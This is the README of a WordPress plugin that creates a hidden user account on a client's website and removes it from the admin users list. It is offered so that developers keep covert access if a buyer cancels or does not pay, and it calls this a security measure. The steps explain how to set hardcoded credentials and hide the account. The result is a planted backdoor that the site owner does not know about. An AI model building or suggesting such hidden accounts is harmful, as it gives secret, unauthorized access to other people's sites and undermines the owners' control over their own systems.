# WordPress User Security
## Hide User from WordPress Admin Panel

This plugin is specially designed WordPress developers to access the client's website for security purposes. We have seen the cases sometimes buyer cancel the order or not give you a payment after completing the website so with this plugin you can access the client website and hide your special user account from the users page.

## How To Use?
Because this plugin is for security reasons so we didn't create any frontend page for settings. You have to edit some options before using it.

### 1. First edit user function
On line #26 you find function `ecoderz_addHiddenUserFunction()`. In this function set the values of these variables `$username`, `$useremail` and `$userpass` with your information.

```ruby
$username   =   "ecoderz";
$useremail  =   "contact@ecoderz.com";
$userpass   =   "@ecoderz";
```

### 2. Second edit user table function
On line #48 you'll find the function `ecoderz_preUserQuery()`. In this function set the value of `$hiddenuser` with your `$username`.

That's it, Hope you guys will find this plugin helpfull.